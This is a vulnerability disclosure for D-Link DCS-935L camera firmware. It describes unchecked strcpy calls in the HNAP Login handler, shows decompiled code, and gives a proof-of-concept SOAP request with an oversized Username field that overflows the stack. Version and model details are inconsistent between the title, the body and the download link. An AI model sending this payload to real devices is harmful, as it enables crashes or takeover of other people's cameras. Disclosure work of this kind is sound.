# DCS-935L_A1_FW_1.13.01_r4589  Stack overflow vulnerability

## INFO
Manufacturer's address：https://www.dlink.com/
Firmware download address ： https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L

## Affected version
The firmware used in this analysis is 1.09

## Vulnerability details

At HNAP service, In the Login function, I can enter Action, the Action will strcpy to v42, but program do not check size, resulting in stack overflow.

```c
int __fastcall Login(int a1)
{
......
	ElementByTag = ixmlGetElementByTag(a1, "Login");
  v5 = ElementByTag;
  if ( !ElementByTag )
  {
    ixmlAppendNewElement(Document, Element, "LoginResult", "failed");
    v15 = Document;
    goto LABEL_49;
  }
  ElementValueByTag = (const char *)ixmlGetElementValueByTag(ElementByTag, "Action");
  if ( ElementValueByTag )
    strcpy(v42, ElementValueByTag);
......
}
```

In the Login function, I can enter Username and LoginPassword, the username&password will strcpy to v36&v38, but program do not check the size, resulting in stack overflow.

```c
int __fastcall Login(int a1)
{
......
				v16 = (const char *)ixmlGetElementValueByTag(v5, "Username");
        v17 = (const char *)ixmlGetElementValueByTag(v5, "LoginPassword");
        if ( v16 )
        {
          strcpy((char *)v36, v16);
          if ( !strcmp((const char *)v36, "Admin") )
            snprintf((char *)v36, 0x20u, "%s", "admin");
        }
        if ( v17 )
          strcpy(v38, v17);
        v53 = (const char *)v36;
        fprintf(stderr, "username: %s\\n", (const char *)v36);
        v55 = v38;
        fprintf(stderr, "loginPassword: %s\\n", v38);
......
}

```

## POC

```python
SOAPAction: http://192.168.0.1/HNAP1/Login
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://192.168.0.1/HNAP1/">
      <Action></Action>
      <Username>a * 0x10000</Username>
      <LoginPassword/>
      <Captcha/>
    </Login>
  </soap:Body>
</soap:Envelope>
```
